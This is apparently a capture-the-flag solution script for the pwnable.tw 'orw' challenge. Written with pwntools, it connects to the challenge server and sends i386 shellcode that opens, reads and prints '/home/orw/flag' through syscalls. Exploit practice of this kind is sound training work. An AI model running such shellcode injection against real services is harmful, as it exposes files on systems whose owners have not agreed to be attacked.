import os
from pwn import *

pc = './orw'
context.log_level = True
context.arch = 'i386'

remote_ip = 'chall.pwnable.tw'
remote_port = 10001

#p = process(pc)
p = remote(remote_ip,remote_port)
#gdb.attach(p,'b *0x08048582')
shellcode = 0x0804A060


p.recvuntil('shellcode:')

payload = asm('xor eax,eax')
payload += asm('xor ebx,ebx')
payload += asm('xor ecx,ecx')
payload += asm('xor edx,edx')
payload += asm('push 0x6761')
payload += asm('push 0x6c662f77')
payload += asm('push 0x726f2f65')
#payload += asm('push 0x67616c')
#payload += asm('push 0x662f6b63')
#payload += asm('push 0x617a2f65')
payload += asm('push 0x6d6f682f')
payload += asm('mov ebx,esp')
payload += asm('mov eax,5')
payload += asm('int 0x80')
payload += asm('mov ebx,eax;mov ecx,0x0804a060;mov edx,0x30;mov eax,3;int 0x80')
payload += asm('mov edx,eax;mov ebx,1;mov eax,4;int 0x80')

#raw_input()

p.send(payload)
print payload
p.interactive()